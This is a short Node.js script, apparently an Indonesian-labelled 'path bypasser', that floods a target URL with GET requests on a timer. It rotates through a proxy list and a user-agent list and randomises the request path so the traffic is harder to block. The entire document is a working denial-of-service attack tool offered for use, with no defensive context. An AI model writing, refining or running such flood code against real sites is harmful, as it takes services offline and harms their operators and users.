const request = require('request');
const fs = require('fs');

if (process.argv.length <= 5) {
  console.log('[PATH-BYPASSER] - V2.1\n\t\tDigunakan untuk bypass: node tlsv2.js <url> <proxylist> <ualist> <durasi>');
  return;
}

const target = process.argv[2];
const proxies = fs.readFileSync(process.argv[3], 'utf-8').split('\n');
let proxyIndex = 0;
const uas = fs.readFileSync(process.argv[4], 'utf-8').split('\n');
let uaIndex = 0;
const duration = process.argv[5];

const headers = {
  'Connection': 'Keep-Alive',
  'Cache-Control': 'max-age=0',
  'Upgrade-Insecure-Requests': '1',
  'User-Agent': '',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'Accept-Encoding': 'gzip, deflate, br',
  'Accept-Language': 'en-US;q=0.9'
};

let count = 0;

const floodRequest = () => {
  count++;
  
  headers['User-Agent'] = uas[uaIndex];
  uaIndex = (uaIndex + 1) % uas.length;

  const proxyOptions = {
    url: target.replace('%RAND%', Math.floor(Math.random() * 10000)),
    headers: headers,
    proxy: 'http://' + proxies[proxyIndex],
    method: 'GET'
  };

  request(proxyOptions, (error, response, body) => {
    if (error) {
      console.log('Error:', error);
    } else {
      console.log('statusCode:', response && response.statusCode);
    }
    console.log(`[${count}] -> PATH_RESOVER -> ${proxyOptions.url}`);
  });

  proxyIndex = (proxyIndex + 1) % proxies.length;
};

const startFlood = () => {
  setInterval(floodRequest, duration);
};

startFlood();